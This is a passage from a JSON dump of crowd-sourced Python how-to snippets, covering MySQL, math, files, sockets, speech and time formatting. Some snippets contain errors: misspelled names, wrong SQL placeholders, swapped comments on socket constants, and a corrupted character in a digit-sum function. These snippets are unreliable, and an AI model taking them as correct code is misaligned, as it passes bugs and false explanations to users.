\tdatabase=\"testdatabase\" \t) mycurser = db.cursor() mycursor.execute(\"CREATE TABLE Person (name VARCHAR(50), age smallint UNSIGNED, personID int PRIMARY KEY AUTO_INCREMENT)\") mycursor.execute(\"DESCRIBE Person\") mycursor.execute(\"INSERT INTO Person (name, age) VALUES ('tech with tim', 45)\") mycursor.execute(\"SELECT * FROM Person\") -- https://www.youtube.com/watch?v=kUBGiABFFHc -------------------------------------------------------------------- import mysql.connector from datetime import datetime db = mysql.connector.connect( \thost=\"localhost\", \tuser=\"root\", \tpasswd=\"root\", \tdatabase=\"testdatabase\" \t) mycursor = db.cursor() mycursor.execute(\"CREATE TABLE Test (name varchar(50) NOT NULL, created datetime NOT NULL, gender ENUM('M', 'F', 'O'), id int PRIMARY KEY NOT NULL AUTO_INCREMENT)\") mycursor.execute(\"INSERT INTO Test (name, created, gender) VALUES (?,?,?)\", ('Tim', datetime.now(), 'M')) mycursor.execute(\"SELECT * FROM Test WHERE gender = 'M' ORDER BY id DESC\") mycursor.execute(\"ALTER TABLE Test ADD COLUMN food VARCHAR(50) NOT NULL\") mycursor.execute(\"DESCRIBE Test\") mycursor.fetchone() mycursor.execute(\"ALTER TABLE Test DROP food\") mycursor.execute(\"ALTER TABLE Test CHANGE name first_name VARCHAR(50)\") db.commit()\nfrom sqlalchemy import create_engineengine = create_engine('sqlite:///:memory:')dff.to_sql('mySQLtable', con = engine)sqldf = pd.read_sql('mySQLtable', con = engine)sqldf\n",
    "reg_date": "2021-10-12T11:34:14.000Z"
  },
  {
    "id": 3900,
    "keyword": null,
    "link": null,
    "title": " python sqrt import",
    "description": "import math  math.sqrt( x )\n",
    "reg_date": "2021-10-12T11:34:14.000Z"
  },
  {
    "id": 3901,
    "keyword": null,
    "link": null,
    "title": " python square root",
    "description": "from math import * # We import the math module print(sqrt(16)) # We print the square root of the number 16\nimport math a = input(\"what do you wnat to square root\") print(math.sqrt(a))\nimport math  toSquare = 300 squared = math.sqrt(toSquare) \nimport math print(math.sqrt(589485))\na = int(input(\"enter a real number: \")) sqrt = a**(1/2) print(\"the square root of \",a ,\"is\",sqrt)\ndef square_root(num):   \treturn num**0.5 #prints out 4 print(square_root(16)) #prints out 10 print(square_root(100))\n",
    "reg_date": "2021-10-12T11:34:14.000Z"
  },
  {
    "id": 3902,
    "keyword": null,
    "link": null,
    "title": " python standard deviation",
    "description": "import numpy as np dataset=[13, 22, 26, 38, 36, 42,49, 50, 77, 81, 98, 110] print('Standard Deviation:', np.std(dataset))  Standard Deviation: 29.694275542602483\nimport numpy as np values=[1,10,100] print(np.std(values)) values=[1,10,100,np.nan] print(np.nanstd(values))\nimport panda as pd df = pd.DataFrame(data) window=5 running_vol=df['x'].rolling(window).std()\n",
    "reg_date": "2021-10-12T11:34:14.000Z"
  },
  {
    "id": 3903,
    "keyword": null,
    "link": null,
    "title": " python start simplehttpserver",
    "description": "# If Python version is 3.X python3 -m http.server  # If Python version is 2.X python -m SimpleHTTPServer\n",
    "reg_date": "2021-10-12T11:34:14.000Z"
  },
  {
    "id": 3904,
    "keyword": null,
    "link": null,
    "title": " python static variable in function",
    "description": "#You can make static variables inside a function in many ways. #____________________________________________________________# \"\"\"1/You can add attributes to a function, and use it as a static variable.\"\"\" def foo():     foo.counter += 1     print (\"Counter is %d\" % foo.counter) foo.counter = 0   #____________________________________________________________# \"\"\"2/If you want the counter initialization code at the top instead of the bottom, you can create a decorator:\"\"\" def static_vars(**kwargs):     def decorate(func):         for k in kwargs:             setattr(func, k, kwargs[k])         return func     return decorate    #Then use the code like this: @static_vars(counter=0) def foo():     foo.counter += 1     print (\"Counter is %d\" % foo.counter)  #____________________________________________________________# \"\"\"3/Alternatively, if you don't want to setup the variable outside the function, you can use hasattr() to avoid an AttributeError exception:\"\"\" def myfunc():     if not hasattr(myfunc, \"counter\"):         myfunc.counter = 0  # it doesn't exist yet, so initialize it     myfunc.counter += 1    #____________________________________________________________#\n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3905,
    "keyword": null,
    "link": null,
    "title": " python store data in file",
    "description": "file = open(\"text.txt\", \"w\")  file.write(\"Your text goes here\")  file.close()  'r' open for reading (default) 'w' open for writing, truncating the file first 'x' open for exclusive creation, failing if the file already exists 'a' open for writing, appending to the end of the file if it exists\nimport pickle file_name = 'data_stuff' try:     # this will create the file if it doesnt already exist     history_data = open(file_name + \".dat\", \"x\")     history_data.close()     history_data = []     pickle.dump(history_data, open(file_name + \".dat\", \"wb\")) except:     # if the file already exist it will load the history_data array      # you can add to it or modity it or just read it.     history_data = pickle.load(open(file_name + \".dat\", \"rb\"))  print(history_data) #this will print the history_data array that was stored in the file foo = 5 history_data.append(foo) print(history_data) pickle.dump(history_data, open(file_name + \".dat\", \"wb\")) # this saves the newly modified history_data to the file\nwith open(filename, \"a+\") as f:   f.write('Hello World')\nfile = open(&ldquo;testfile.txt&rdquo;, &ldquo;r+&rdquo;) \n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3906,
    "keyword": null,
    "link": null,
    "title": " python store save data",
    "description": "import shelve  shelf = shelve.open(filename) shelf['key1'] = value1 shelf['key2'] = value2  shelf.close()  # ---  shelf.open(filename)  value1 = shelf['key1']\n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3907,
    "keyword": null,
    "link": null,
    "title": " python str replace specifiek index",
    "description": "s = s[:index] + newstring + s[index + 1:]\n# strings are immutable in Python,  # we have to create a new string which  # includes the value at the desired index  s = s[:index] + newstring + s[index + 1:]\n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3908,
    "keyword": null,
    "link": null,
    "title": " python string like pattern",
    "description": "import re pattern = re.compile(\"^([A-Z][0-9]+)+$\") pattern.match(string)\n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3909,
    "keyword": null,
    "link": null,
    "title": " python string list to float",
    "description": "[float(i) for i in lst]\n[str(i) for i in mylst]\n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3910,
    "keyword": null,
    "link": null,
    "title": " python string repetition ^",
    "description": "\"cow\" * 3 'cowcowcow' \"cow\" * 10 'cowcowcowcowcowcowcowcowcowcow'\n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3911,
    "keyword": null,
    "link": null,
    "title": " python string sort characters",
    "description": ">>> a = 'ZENOVW' >>> ''.join(sorted(a)) 'ENOVWZ'\n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3912,
    "keyword": null,
    "link": null,
    "title": " python string strip non alphanumeric",
    "description": "Regular expressions to the rescue:  import re stripped_string = re.sub(r'\\W+', '', your_string)\n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3913,
    "keyword": null,
    "link": null,
    "title": " python string to bytes",
    "description": "# utf-8 is used here because it is a very common encoding, but you # need to use the encoding your data is actually in. bytes = b'abcde' bytes.decode(\"utf-8\")  'abcde'\ns = 'abc'  # string to bytes using bytes() b = bytes(s, encoding='utf-8') print(type(b))\t\t\t\t\t\t\t# <class 'bytes'> print(b)\t\t\t\t\t\t\t\t# b'abc'  # bytes to string using decode() s = b.decode() print('Original String =', s)\t\t\t# Original String = abc s = 'xyz'\t\t\t\t\t\t\t\t  # string to bytes using encode() b = s.encode(encoding='utf-8') print(b)\t\t\t\t\t\t\t\t# b'xyz' s = b.decode() print('Original String =', s)\t\t\t# Original String = xyz\ndata = \"\"  \t\t\t#string data = \"\".encode()\t#bytes data = b\"\" \t\t\t#bytes data = b\"\".decode() #string data = str(b\"\")  \t#string\na_string = \"abc\" encoded_string = a_string. encode() byte_array = bytearray(encoded_string) print(byte_array)\n#Python string to bytes:  s = 'abc'  # string to bytes using bytes() b = bytes(s, encoding='utf-8') print(type(b))\t\t\t\t\t\t\t# <class 'bytes'> print(b)\t\t\t\t\t\t\t\t# b'abc'  # bytes to string using decode() s = b.decode() print('Original String =', s)\t\t\t# Original String = abc s = 'xyz'\t\t\t\t\t\t\t\t  # string to bytes using encode() b = s.encode(encoding='utf-8') print(b)\t\t\t\t\t\t\t\t# b'xyz' s = b.decode() print('Original String =', s)\t\t\t# Original String = xyz\n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3914,
    "keyword": null,
    "link": null,
    "title": " python string to hex",
    "description": "hex_string = \"0xAA\" # \"0x\" also required  an_integer = int(hex_string, 16) # an_integer is a decimal value  hex_value = hex(an_integer) print(hex_value)\n>>> s = 'The quick brown fox jumps over the lazy dog.'.encode('utf-8') >>> s b'The quick brown fox jumps over the lazy dog.' >>> s.hex() '54686520717569636b2062726f776e20666f78206a756d7073206f76657220746865206c617a7920646f672e' \n",
    "reg_date": "2021-10-12T11:34:15.000Z"
  },
  {
    "id": 3915,
    "keyword": null,
    "link": null,
    "title": " python strip newline from string",
    "description": "line = line.strip('\\n') line = line.strip('\\t')\na_string = a_string.rstrip(\"\\n\")\nmylist = [] # Assuming that you have loaded data into a lines variable.  for line in lines:     mylist.append(line.strip().split('\\t')\n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3916,
    "keyword": null,
    "link": null,
    "title": " python strip non numeric in string",
    "description": ">>> import re >>> re.sub(\"[^0-9]\", \"\", \"sdkjh987978asd098as0980a98sd\") '987978098098098' \n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3917,
    "keyword": null,
    "link": null,
    "title": " python strptime exemples",
    "description": " from datetime import datetime  dt_string = \"12/11/2018 09:15:32\"  # Considering date is in dd/mm/yyyy format dt_object1 = datetime.strptime(dt_string, \"%d/%m/%Y %H:%M:%S\") print(\"dt_object1 =\", dt_object1)  # Considering date is in mm/dd/yyyy format dt_object2 = datetime.strptime(dt_string, \"%m/%d/%Y %H:%M:%S\") print(\"dt_object2 =\", dt_object2) \n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3918,
    "keyword": null,
    "link": null,
    "title": " python subset pandas dataframe based on list of booleans",
    "description": "# Basic syntax: dataframe_subset = dataframe[list_of_booleans] # Where the list_of_booleans is equal to the length of the dataframe\n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3919,
    "keyword": null,
    "link": null,
    "title": " python subtract 14 days from date",
    "description": "from datetime import date, timedelta dt = date.today() - timedelta(5) print('Current Date :',date.today()) print('5 days before Current Date :',dt)  \na_date = datetime.date(2015, 10, 10) days = datetime.timedelta(5)  new_date = a_date - days #Subtract 5 days from a_date   print(new_date) #OUTPUT #2015-10-05\ndf_test['Difference'] = (df_test['First_Date'] - df_test['Second Date']).dt.days\n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3920,
    "keyword": null,
    "link": null,
    "title": " python subtract 2 strings",
    "description": "def substract(a, b):                                   return \"\".join(a.rsplit(b))\n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3921,
    "keyword": null,
    "link": null,
    "title": " python subtract one list from another",
    "description": "# Subtract list1 from list2 (find only items not in both lists) list1 = [2, 2, 2] list2 = [1, 1, 1] difference = []   # initialization of result list  zip_object = zip(list1, list2)  for list1_i, list2_i in zip_object:     difference.append(list1_i-list2_i) # append each difference to list  print(difference)\n[item for item in x if item not in y]\n c = [x for x in a if x not in b]\n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3922,
    "keyword": null,
    "link": null,
    "title": " python sum of digits",
    "description": "def sum_digits(n):     s = 0     while n:         s += n % 10         n //= 10     return s\nsum(list(map(int,input().split()))) \nnumber = 123 # the number you want summed up sum_of_digits = 0  for digit in str(number):   sum_of_digits += int(digit)    print(sum_of_digits) # printing the final sum of number\nnumber = 123 # the number you want to sum the digits of  sum_of_digits = sum(int(digit) for digit in str(number))  print(sum_of_digits)\ndigit_sum = lambda s: sum(int(digit) for digit in str(s)) #without recursion  #sum of digits using recursion  dsum = 0 # we define dsum outside of the function so its value isn't reset every time the function gets called recursivley  def rdigit_sum(s):     global dsum # making dsum 'global' allows us to use it a function     if s: # checks if s has digits to add to dsum         dsum += s\u0010 # adds the current units digit to dsum         s = s//10 # removes the current units digit     else: # if there are no digits left         s = dsum  # this block reassigns s to dsum, then resets dsum to 0 so dsum doesn't already have a value if this function is called more than once in a program         dsum = 0         return s       return rdigit_sum(s) # this is the 'recursive' part of the program that calls the function again\n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3923,
    "keyword": null,
    "link": null,
    "title": " python sum of last n items in list",
    "description": "test_list = [4, 5, 2, 6, 7, 8, 10]  K = 5    # Inverse K slice Sum using list slicing + sum() res = sum(test_list[-K:])   print(\"The last K elements sum of list is : \" + str(res))   # Result: # The last K elements sum of list is : 33\n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3924,
    "keyword": null,
    "link": null,
    "title": " python svg to png",
    "description": "# pip install cairosvg import cairosvg  svg_code = \"\"\"     <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"#000\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\">         <circle cx=\"12\" cy=\"12\" r=\"10\"/>         <line x1=\"12\" y1=\"8\" x2=\"12\" y2=\"12\"/>         <line x1=\"12\" y1=\"16\" x2=\"12\" y2=\"16\"/>     </svg> \"\"\" cairosvg.svg2png(bytestring=svg_code,write_to='output.png')   cairosvg.svg2pdf( \turl='image.svg', write_to='image.pdf')  cairosvg.svg2png(     url=\"/path/to/input.svg\", write_to=\"/tmp/output.png\")  cairosvg.svg2pdf(     file_obj=open(\"/path/to/input.svg\", \"rb\"), write_to=\"/tmp/output.pdf\")  output = cairosvg.svg2ps(     bytestring=open(\"/path/to/input.svg\").read().encode('utf-8'))  # https://cairosvg.org/ # https://stackoverflow.com/questions/6589358/convert-svg-to-png-in-python\n",
    "reg_date": "2021-10-12T11:34:16.000Z"
  },
  {
    "id": 3925,
    "keyword": null,
    "link": null,
    "title": " python swap frames",
    "description": "from tkinter import *  def raise_frame(frame):     frame.tkraise()  root = Tk()  f1 = Frame(root) f2 = Frame(root) f3 = Frame(root) f4 = Frame(root)  for frame in (f1, f2, f3, f4):     frame.grid(row=0, column=0, sticky='news')  Button(f1, text='Go to frame 2', command=lambda:raise_frame(f2)).pack() Label(f1, text='FRAME 1').pack()  Label(f2, text='FRAME 2').pack() Button(f2, text='Go to frame 3', command=lambda:raise_frame(f3)).pack()  Label(f3, text='FRAME 3').pack(side='left') Button(f3, text='Go to frame 4', command=lambda:raise_frame(f4)).pack(side='left')  Label(f4, text='FRAME 4').pack() Button(f4, text='Goto to frame 1', command=lambda:raise_frame(f1)).pack()  raise_frame(f1) root.mainloop()\n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3926,
    "keyword": null,
    "link": null,
    "title": " python sympy solve equation equal to 0",
    "description": "from sympy import *  x, y = symbols('x y')   y=(x**2-2)/3*x  # solve the expression y (by default set equal to 0) result = solve(y)  print(result) \n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3927,
    "keyword": null,
    "link": null,
    "title": " python sympy symbols",
    "description": ">>> x = symbols('x') >>> expr = x + 1 >>> x = 2 >>> print(expr) x + 1 \n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3928,
    "keyword": null,
    "link": null,
    "title": " python sys halt",
    "description": "import sys #put your code here sys.exit\n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3929,
    "keyword": null,
    "link": null,
    "title": " python system arguments",
    "description": "import sys  print 'Number of arguments:', len(sys.argv), 'arguments.' print 'Argument List:', str(sys.argv)  ########### command: python test.py arg1 arg2 arg3 ############ Number of arguments: 4 arguments. Argument List: ['test.py', 'arg1', 'arg2', 'arg3']\nimport sys print(\"This is the name of the script:\", sys.argv[0]) print(\"Number of arguments:\", len(sys.argv)) print(\"The arguments are:\" , str(sys.argv))  #Example output #This is the name of the script: sysargv.py #Number of arguments in: 3 #The arguments are: ['sysargv.py', 'arg1', 'arg2']\nimport sys  def hello(a,b):     print \"hello and that's your sum:\", a + b  if __name__ == \"__main__\":     a = int(sys.argv[1])     b = int(sys.argv[2])     hello(a, b) # If you type : py main.py 1 5 # It should give you \"hello and that's your sum:6\"\n#!/usr/bin/python  import sys  print 'Number of arguments:', len(sys.argv), 'arguments.' print 'Argument List:', str(sys.argv)  #Terminal # $ python test.py arg1 arg2 arg3  #print #Number of arguments: 4 arguments. #Argument List: ['test.py', 'arg1', 'arg2', 'arg3']  \n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3930,
    "keyword": null,
    "link": null,
    "title": " python tabulate float format",
    "description": "print tabulate([[\"pi\",3.141593],[\"e\",2.718282]], floatfmt=\".2f\") # --  ---- # pi  3.14 # e   2.71 # --  ----\n>>> x = 13.949999999999999999 >>> x 13.95 >>> g = float(\"{:.2f}\".format(x)) >>> g 13.95 >>> x == g True >>> h = round(x, 2) >>> h 13.95 >>> x == h True\n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3931,
    "keyword": null,
    "link": null,
    "title": " python tcp socket example",
    "description": "# Basic example where server accepts messages from client.  # importing socket library import socket  # socket.AF_INET means we're using IPv4 ( IP version 4 ) # socket.SOCK_STREAM means we're using TCP protocol for data transfer socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  print(\"Choose mode. s - server, c - client\") mode = input(\"> \")  if mode == \"s\":   ip = input(\"Your computer's ip address: \")   port = 80      # Binding socket to specified ip address and port   socket.bind((ip, port))      # This is max ammount of clients we will accept   socket.listen(1)      # Accepting connection from client   sock, addr = socket.accept()   print(\"Client connected from\", addr)      # Receiving data from client   while True:     data = sock.recv(16384) # Raw data from client     text = data.decode('utf-8') # Decoding it          print(\"Message from client:\", text)      elif mode == \"c\":   ip = input(\"Server ip address: \")      # Connecting to server   socket.connect((ip, 80))      # Sending data   while True:     socket.send(input(\"Message: \").encode('utf-8'))\nimport socket TCP_IP = '127.0.0.1' TCP_PORT = 5005 BUFFER_SIZE = 1024 MESSAGE = \"Hello, World!\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((TCP_IP, TCP_PORT)) s.send(MESSAGE) data = s.recv(BUFFER_SIZE) s.close() print \"received data:\", data\ntarget_host = \"www.google.com\"    target_port = 80  # create a socket object  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     # connect the client  client.connect((target_host,target_port))     # send some data  request = \"GET / HTTP/1.1\\r\\nHost:%s\\r\\n\\r\\n\" % target_host client.send(request.encode())     # receive some data  response = client.recv(4096)   http_response = repr(response) http_response_len = len(http_response)   #display the response gh_imgui.text(\"[RECV] - length: %d\" % http_response_len) gh_imgui.text_wrapped(http_response)\n####### TCP Server #######  from socket import AF_INET,SOCK_STREAM,socket  # AF_INET => TCP # SOCK_STREAM => IPv4  sobj = socket(AF_INET,SOCK_STREAM) sobj.bind(('127.0.0.1',12345)) sobj.listen(1)  client , addr = sobj.accept() print(\"the ip is connected to server \",addr)  while(True):          message = input()     if(message == \"exit\"):         client.close()         break     else:         client.send(message.encode())           ####### TCP Client #######  from socket import AF_INET,SOCK_STREAM,socket  sobj = socket(AF_INET,SOCK_STREAM) sobj.connect(('127.0.0.1',12345)) while True:     message = sobj.recv(2048)     if(message == \"exit\"):         sobj.close()         break     elif(message.decode() == ''):         pass     else:         print(message.decode())      \n#!/usr/bin/env python3  import socket  HOST = '127.0.0.1'  # Standard loopback interface address (localhost) PORT = 65432        # Port to listen on (non-privileged ports are > 1023)  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:     s.bind((HOST, PORT))     s.listen()     conn, addr = s.accept()     with conn:         print('Connected by', addr)         while True:             data = conn.recv(1024)             if not data:                 break             conn.sendall(data) \n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3932,
    "keyword": null,
    "link": null,
    "title": " python teilen ohne rest",
    "description": "10 // 3 #output: 3 29 // 5 #output: 5\n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3933,
    "keyword": null,
    "link": null,
    "title": " python template generics",
    "description": "from typing import TypeVar, Generic  T = TypeVar('T')  class Stack(Generic[T]):     def __init__(self) -> None:         # Create an empty list with items of type T         self.items: List[T] = []      def push(self, item: T) -> None:         self.items.append(item)      def pop(self) -> T:         return self.items.pop()      def empty(self) -> bool:         return not self.items \n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3934,
    "keyword": null,
    "link": null,
    "title": " python termcolor",
    "description": "# To install termcolor pip install termcolor\nimport sys from termcolor import colored, cprint  text = colored('Hello, World!', 'red', attrs=['reverse', 'blink']) print(text) cprint('Hello, World!', 'green', 'on_red')  print_red_on_cyan = lambda x: cprint(x, 'red', 'on_cyan') print_red_on_cyan('Hello, World!') print_red_on_cyan('Hello, Universe!')  for i in range(10):     cprint(i, 'magenta', end=' ')  cprint(\"Attention!\", 'red', attrs=['bold'], file=sys.stderr) \n",
    "reg_date": "2021-10-12T11:34:17.000Z"
  },
  {
    "id": 3935,
    "keyword": null,
    "link": null,
    "title": " python test if number in string",
    "description": ">>> def hasNumbers(inputString): ...     return any(char.isdigit() for char in inputString) ...  >>> hasNumbers(\"I own 1 dog\") True >>> hasNumbers(\"I own no dog\") False\n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3936,
    "keyword": null,
    "link": null,
    "title": " python test if string is int",
    "description": "'16'.isdigit() >>>True  '3.14'.isdigit() >>>False  'Some text'.isdigit() >>>False\ndef RepresentsInt(s):     try:          int(s)         return True     except ValueError:         return False\n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3937,
    "keyword": null,
    "link": null,
    "title": " python test if value is np.nan",
    "description": "import numpy as np  mynan = np.nan mynum = 18  print(\"NaN? : \", np.isnan(mynan)) # Use np.isnan() to test print(\"NaN? : \", np.isnan(mynum))  # Results: # Nan? : True # NaN? : False\narray_has_nan = np.isnan(array_sum)\nmath.isnan(n)\nimport math print math.isnan(float('NaN'))OutputTrue print math.isnan(1.0)OutputFalse \nimport numpy as np import pandas as pd  val = np.nan  print(pd.isnull(val)) # True\n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3938,
    "keyword": null,
    "link": null,
    "title": " python text to speech",
    "description": "The best library because you dont have to save the text file or open the file to start the speech  pip install pyttsx3  import pyttsx3 engine = pyttsx3.init() engine.say(\"Hello world\") engine.runAndWait()\nfrom gtts import gTTS from playsound import  playsound  mytext=\"Hello Geek! How are you doing??\" language='en' myobj=gTTS(text=mytext,lang=language,slow=True) myobj.save(\"welcome1.mp3\") playsound(\"welcome1.mp3\")\n#pip install SpeechRecognition #in case of error use 'pip install pyaudio' or... #in case of error use 'pip install pipwin' then 'pipwin install pyaudio' #if error continued you may need to use python 3.6 or lower as the latest  #python may not support pyaudio...  import speech_recognition as sr import pyttsx3  #audio of system to respond engine = pyttsx3.init('sapi5') voices = engine.getProperty('voices') engine.setProperty('voice', voices[0].id) engine.setProperty('rate',180)  def speak(audio):     engine.say(audio)     engine.runAndWait()  # simple function to recognise speech from user def takecommand():     #it takes microphone input and returns string output     r = sr.Recognizer()     with sr.Microphone() as source:         print('Listening.....')         r.pause_threshold = 1         r.energy_threshold = 4000         audio = r.listen(source)      try:         print('Recognising...')         query = r.recognize_google(audio, language='en-in')         print('User Said : ' , query)      except Exception as e:         print('exception : ',e)          speak(\"Sorry, I didn't hear that, Say that again Please\")         return \"None\"     return query while True:   query = takecommand() # whatever user says will be stored in this variable   print(\"The Test got in program is : \"+query) \nimport speech_recognition as sr  def take_command():     r = sr.Recognizer()     with sr.Microphone() as source:         print('Listening...')         r.pause_threshold = 1         r.energy_threshold = 50         audio = r.listen(source)      try:         print('Recognizing...')         qry = r.recognize_google(audio, language='en-in')         print(f\"user said: {qry}\\n\")          #     if any error occurs this line will run     except Exeption as e:     # if you don't want to print the error comment the bottom line         print(e)         print('Say that again please\\n')         return 'None'      return qry    if __name__ == '__main__': \twhile True:   \t\tqry = takecommand().lower()    # now you can use the takecommand function where you want to recognize speech # And please experiment with the above code  # like what pause_threshold and energy_threshold do  /\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\---  *HAPPYCODING*  ---/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\\npip install pyttsx3 import pyttsx3 friend = pyttsx3.init() friend.say(\"you are very smart\") friend.runandwait()\nfrom text_to_speech import speak  speak(\"Hello\", \"en\", save=True, file=\"speech.mp3\")\n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3939,
    "keyword": null,
    "link": null,
    "title": " python thread not joining",
    "description": "without join: +---+---+------------------                     main-thread     |   |     |   +...........                            child-thread(short)     +..................................         child-thread(long)  with join +---+---+------------------***********+###      main-thread     |   |                             |     |   +...........join()            |         child-thread(short)     +......................join()......         child-thread(long)  with join and daemon thread +-+--+---+------------------***********+###     parent-thread   |  |   |                             |   |  |   +...........join()            |        child-thread(short)   |  +......................join()......        child-thread(long)   +,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,     child-thread(long + daemonized)  '-' main-thread/parent-thread/main-program execution '.' child-thread execution '#' optional parent-thread execution after join()-blocked parent-thread could      continue '*' main-thread 'sleeping' in join-method, waiting for child-thread to finish ',' daemonized thread - 'ignores' lifetime of other threads;     terminates when main-programs exits; is normally meant for      join-independent tasks\n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3940,
    "keyword": null,
    "link": null,
    "title": " python tim script",
    "description": "import time start_time = time.time() print(\"Hello\") \t# Hello end_time = time.time() total_time = end_time - start_time print(\"Time: \", total_time)\nfrom datetime import datetime start = datetime.now() # some kind of code print(datetime.now() - start)\n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3941,
    "keyword": null,
    "link": null,
    "title": " python time.strptime milliseconds",
    "description": "time_string = \"19/01/20 16:31:32.123\" format_string = \"%d/%m/%y %H:%M:%S.%f\"  date_object = datetime.strptime(time_string, format_string)  print(date_object)\n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3942,
    "keyword": null,
    "link": null,
    "title": " python time a funciton",
    "description": "import time  start = time.time() print(\"hello\") end = time.time() print(end - start) \n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3943,
    "keyword": null,
    "link": null,
    "title": " python time code",
    "description": "import time  t0 = time.time() code_block t1 = time.time()  total = t1-t0\nt = time.localtime()            # Gets the local time current_time = time.strftime(\"%H:%M\", t)          # Gets the time in the desired format current_time = \"The time is \" + current_time  \nfrom timer import Timer t = Timer() t.start() # Run stuff here. t.stop()  \nimport time timer_length = float(input(\"How many seconds would you like you're timer to be set for? \")) time.sleep(timer_length) print(\"Done!\")\nimport datetime  x = datetime.datetime.now()  print(x) \n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3944,
    "keyword": null,
    "link": null,
    "title": " python time delay",
    "description": "import time   # Wait for 5 seconds time.sleep(5)   # Wait for 300 milliseconds # .3 can also be used time.sleep(.300) \nimport time while True:     print(\"This prints once a minute.\")     time.sleep(60) # Delay for 1 minute (60 seconds).\n>>> import time >>> time.sleep(3) # Sleep for 3 seconds \nimport time  time.sleep(5) # sleeps for 5 seconds\nimport time x = 1 # Put in whatever seconds you want it to wait time.sleep(x) \nimport time time.sleep(3) #3s Delay!\n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3945,
    "keyword": null,
    "link": null,
    "title": " python time execution",
    "description": "import time start_time = time.time() print(\"Hello\") \t# Hello end_time = time.time() total_time = end_time - start_time print(\"Time: \", total_time)\nfrom time import time  start = time() #code here print(f'Time taken to run: {time() - start} seconds'\nimport time start_time = time.time() main() print(\"--- %s seconds ---\" % (time.time() - start_time))\nimport time from datetime import timedelta  start_time = time.monotonic() # do your work here end_time = time.monotonic() print(timedelta(seconds=end_time - start_time))\n#Python time execution import time start_time = time.time() print(\"Hello\") \t# Hello end_time = time.time() total_time = end_time - start_time print(\"Time: \", total_time)\n#its tricky and so much easy #python execute time counter #coded by Luban import time start_time = time.time() while True:     x = time.time() - start_time     x = int(x)     print('Current Time = ',str(x))\n",
    "reg_date": "2021-10-12T11:34:18.000Z"
  },
  {
    "id": 3946,
    "keyword": null,
    "link": null,
    "title": " python time format",
    "description": "The program below converts a datetime object containing current date and time to different string formats.  Code:    from datetime import datetime  now = datetime.now() # current date and time  year = now.strftime(\"%Y\") print(\"year:\", year)  month = now.strftime(\"%m\") print(\"month:\", month)  day = now.strftime(\"%d\") print(\"day:\", day)  time = now.strftime(\"%H:%M:%S\") print(\"time:\", time)  date_time = now.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)\t  Output after run the code: year: 2020 month: 03 day: 31 time: 04:59:31 date and time: 03/31/2020, 04:59:31        Here, year, day, time and date_time are strings, whereas now is a datetime object.\n| Directive | Meaning                                                        | Example                 |  |-----------|------------------------------------------------------------------------------------------| |%a         | Abbreviated weekday name.                                      | Sun, Mon, ..            |  |%A         | Full weekday name.                                             | Sunday, Monday, ...     |  |%w         | Weekday as a decimal number.                                   | 0, 1, ..., 6            |  |%d         | Day of the month as a zero-padded decimal.                     | 01, 02, ..., 31         |  |%-d        | Day of the month as a decimal number.                          | 1, 2, ..., 30           |  |%b         | Abbreviated month name.                                        | Jan, Feb, ..., Dec      |  |%B         | Full month name.                                               | January, February, ...  |  |%m         | Month as a 